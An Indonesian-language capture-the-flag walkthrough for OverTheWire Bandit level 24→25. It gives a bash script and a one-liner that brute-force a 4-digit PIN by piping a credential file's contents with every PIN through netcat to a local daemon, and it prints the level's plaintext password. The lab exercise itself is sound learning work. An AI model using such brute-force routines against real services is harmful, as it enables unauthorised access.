# Over The Wire

## Bandit Level 24 → 25

### Deskripsi Level

Pada level ini terdapat sebuah **daemon** yang berjalan di:

```
localhost:30002
```

Daemon tersebut akan memberikan password untuk level berikutnya jika kita mengirimkan:

```
<password_bandit24> <4_digit_pincode>
```

Masalahnya:

* PIN terdiri dari 4 digit angka (0000–9999)
* Tidak ada cara mengetahui PIN selain mencoba semua kemungkinan
* Total kombinasi: **10000**
* Metode yang digunakan: **Brute Force**

---

### Tugas

* Mengirim password bandit24 + PIN 4 digit ke port 30002
* Menemukan PIN yang benar
* Mendapatkan password Level 25

---

### Proses

1. Masuk Server :

```bash
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

---

2. Buat script brute force

Masuk ke directory sementara:

```bash
$ cd /tmp
```

Buat file:

```bash
$ nano script.sh
```

Isi dengan:

```bash
#!/bin/bash

for i in {0..9}
do
  for j in {0..9}
  do
    for k in {0..9}
    do
      for l in {0..9}
      do
        echo "$(cat /etc/bandit_pass/bandit24) $i$j$k$l"
      done
    done
  done
done
```

Penjelasan:

* Loop 4 tingkat → menghasilkan 0000–9999
* Menggabungkan password bandit24 dengan setiap kombinasi
* Format sesuai yang diminta daemon

---

3. Jalankan script dan simpan output

```bash
$ bash script.sh > test.txt
```

File `test.txt` sekarang berisi 10000 kombinasi.

---

4. Kirim ke daemon menggunakan netcat

```bash
$ cat test.txt | nc localhost 30002 > password.txt
```

Penjelasan:

* `nc` → mengirim data ke port 30002
* Output daemon disimpan ke `password.txt`

---

5. Cek hasilnya

Sebagian besar output berisi:

```
Wrong! Please enter the correct pincode. Try again.
```

Untuk mencari hasil unik:

```bash
$ sort password.txt | uniq
```

Akan muncul satu baris berbeda yang merupakan password level berikutnya.

---

### Output

```
Username: bandit25
Password: UoNGOS8gUE7snukf3bvZOxhnrjzSGZG
```

Itulah password untuk login ke Level 25.

---

### Alternatif Singkat (One-liner)

Tanpa file sementara:

```bash
$ for i in {0000..9999}; do echo "$(cat /etc/bandit_pass/bandit24) $i"; done | nc localhost 30002
```

---

### Yang Gw Pelajari

* Konsep brute force sederhana
* Nested loop di bash
* Automasi input ke network service
* Penggunaan `nc` (netcat)
* Pentingnya memahami format input yang diminta service